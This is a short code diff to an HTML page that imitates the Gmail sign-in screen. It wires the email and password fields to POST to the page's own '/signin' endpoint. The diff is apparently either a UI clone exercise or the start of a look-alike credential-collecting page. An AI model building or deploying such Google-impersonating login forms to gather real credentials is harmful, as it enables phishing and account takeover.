@@ -20,16 +20,16 @@
               <h2>Sign in</h2>
               <p>to continue to Gmail</p>
           </div>
-          <form autocomplete="off" post="/login"> 
+          <form autocomplete="off" method="POST" action="/signin"> 
           <div class="form-input-group">
-              <input id="inputField" type="text" required   class="input-area">
+              <input id="inputField" type="text" required name="username" class="input-area">
               <label for="inputField" class="label">Email or phone</label>
           </div>
           <div class="form-input-group">
-            <input id="password" type="password" required class="input-area">
+            <input id="password" type="password" name="password"  required class="input-area">
             <label for="password" class="label">Password</label>
         </div>
-          <div class="form-sign"><button class="sign-in-btn">Sign in</button></div>
+          <div class="form-sign"><button type="submit" class="sign-in-btn">Sign in</button></div>
          </form>
       </div>
       <div class="setting">
